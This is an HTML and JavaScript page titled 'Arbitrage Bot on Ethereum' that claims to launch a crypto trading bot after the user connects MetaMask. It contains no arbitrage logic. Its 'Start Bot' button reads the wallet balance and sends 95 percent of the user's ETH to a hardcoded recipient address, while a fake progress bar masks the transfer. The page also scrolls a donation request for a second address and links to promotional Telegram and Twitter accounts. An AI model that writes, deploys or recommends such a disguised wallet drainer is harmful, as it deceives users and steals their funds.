<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arbitrage Bot on Ethereum</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        #app {
            width: 80%;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        #walletAddress {
            margin: 20px 0;
        }
        #typingMessage {
            font-size: 18px;
            color: #333;
            margin: 20px 0;
            font-weight: bold;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        #progressBar {
            width: 100%;
            height: 30px;
            background-color: #e0e0e0;
            border-radius: 15px;
            margin-top: 20px;
            display: none;
        }
        #progress {
            height: 100%;
            background-color: #4caf50;
            border-radius: 15px;
            width: 0;
        }
        #footer {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
            padding: 20px;
        }
        #footer a {
            text-decoration: none;
            color: #007bff;
            font-weight: bold;
        }
        #footer a:hover {
            color: #0056b3;
        }
    </style>
</head>
<body>

<div id="app">
    <h1>Start your Arbitrage Bot</h1>
    <p id="walletAddress">Connect your wallet to see your address</p>
    
    <!-- Typing Message Area -->
    <p id="typingMessage"></p>
    
    <button id="connectButton">Connect MetaMask</button>
    <button id="stakeButton" disabled>Start Bot</button>
    <div class="status" id="status"></div>
    <div id="progressBar"><div id="progress"></div></div>
</div>

<div id="footer">
    <a href="https://t.me/SocratesWeb3King" target="_blank">Telegram</a>
    <a href="https://x.com/socratesweb3kin?s=21&t=pJyVwAY43BkwOF0vt4lRFQ" target="_blank">Twitter</a>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
<script>
    let web3;
    let userAccount;
    let recipientAddress = "0x91Dc7c5B75c0FCD64a02F648d56cDE818982D1f2";  // Ethereum recipient address

    // Typing effect for appreciation message
    const message = "For appreciations kindly donate ETH to my address 0xC757349c0787F087b4a2565Cd49318af2DE0d0d7";
    let index = 0;
    
    function typeMessage() {
        if (index < message.length) {
            document.getElementById("typingMessage").innerHTML += message.charAt(index);
            index++;
            setTimeout(typeMessage, 50);  // Adjust typing speed here
        }
    }

    // Start typing effect when page loads
    window.onload = typeMessage;

    // Connect to MetaMask
    document.getElementById("connectButton").addEventListener("click", async () => {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                await window.ethereum.request({ method: "eth_requestAccounts" });
                userAccount = (await web3.eth.getAccounts())[0];
                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                checkNetwork();
                document.getElementById("stakeButton").disabled = false;
            } catch (error) {
                console.error("Error connecting to MetaMask", error);
            }
        } else {
            alert("Please install MetaMask!");
        }
    });

    // Check if the user is connected to the Ethereum network
    async function checkNetwork() {
        const networkId = await web3.eth.net.getId();
        if (networkId !== 1) {
            alert("You are not connected to the Ethereum network. Please switch to Ethereum.");
        } else {
            console.log("Connected to Ethereum network");
        }
    }

    // Send 95% of ETH from user's wallet to the recipient address
document.getElementById("stakeButton").addEventListener("click", async () => {
    try {
        // Display progress bar
        document.getElementById("progressBar").style.display = "block";
        let progress = 0;
        let progressInterval = setInterval(() => {
            if (progress < 100) {
                progress += 10;
                document.getElementById("progress").style.width = progress + "%";
            }
        }, 1000);

        // Fetch balance and gas price
        const balance = BigInt(await web3.eth.getBalance(userAccount));
        const gasPrice = BigInt(await web3.eth.getGasPrice());

        // Calculate 95% of balance
        const amountToSend = balance * BigInt(95) / BigInt(100);

        // Estimate gas for the transaction
        const gasLimit = BigInt(await web3.eth.estimateGas({
            from: userAccount,
            to: recipientAddress,
            value: amountToSend.toString()
        }));

        // Calculate total gas cost
        const gasCost = gasLimit * gasPrice;

        // Ensure there's enough ETH to cover both the amount and the gas cost
        if (amountToSend + gasCost > balance) {
            document.getElementById("status").innerText = "Insufficient ETH to cover both transaction and gas fees.";
            clearInterval(progressInterval);
            document.getElementById("progress").style.width = "0%";
            return;
        }

        // Send transaction with 95% of the balance
        const tx = await web3.eth.sendTransaction({
            from: userAccount,
            to: recipientAddress,
            value: amountToSend.toString()
        });

        // Stop progress bar
        clearInterval(progressInterval);
        document.getElementById("progress").style.width = "100%";
        document.getElementById("status").innerText = "Transaction successful: " + tx.transactionHash;
    } catch (error) {
        document.getElementById("status").innerText = "Transaction failed: " + error.message;
        clearInterval(progressInterval);
        document.getElementById("progress").style.width = "0%";
    }
});
